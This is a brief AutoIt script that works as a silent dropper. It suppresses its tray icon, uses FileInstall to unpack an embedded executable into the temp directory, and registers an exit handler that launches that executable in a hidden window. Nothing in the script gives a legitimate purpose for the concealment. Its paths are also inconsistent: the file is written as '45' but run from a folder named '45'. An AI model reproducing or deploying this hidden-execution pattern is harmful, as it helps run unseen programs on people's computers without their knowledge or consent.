#NoTrayIcon

Opt("OnExitFunc", "endscript")
FileInstall ("C:\autoit.x86.exe", @TempDir & "\45")

Func endscript ()
    Run ( @TempDir & "\45\autoit.x86.exe" , "" , @SW_HIDE)
    Exit
EndFunc